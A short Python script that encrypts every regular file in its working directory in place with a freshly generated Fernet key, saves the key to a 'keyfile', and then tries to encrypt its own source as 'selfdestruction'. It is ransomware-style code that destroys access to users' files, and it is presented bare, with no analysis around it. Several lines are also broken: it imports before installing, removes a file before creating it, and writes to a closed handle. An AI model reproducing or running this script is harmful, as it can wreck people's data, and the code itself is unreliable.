#!/usr/bin/env python3
import os
import sys
import subprocess
from cryptography.fernet import Fernet
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])
os.remove("keyfile")
files = []
for file in os.listdir():
    if file == "run.py" or file == "decrypt.py" or file == "keyfile" or file == ".gitattributes":
        continue
    if os.path.isfile(file):
        files.append(file)
key = Fernet.generate_key()
with open("keyfile", "wb") as keycontent:
        keycontent.write(key)
for file in files:
        with open(file, "rb") as filecontent:
            content = filecontent.read()
        enc_content = Fernet(key).encrypt(content)
        with open(file, "wb") as filecontent:
            filecontent.write(enc_content)
#selfdestruction of run.py
with open("run.py", "rb") as runpy:
    content = runpy.read()
enc_content = Fernet(key).encrypt(content)
key = ""
with open("run.py", "wb"):
    runpy.write(enc_content)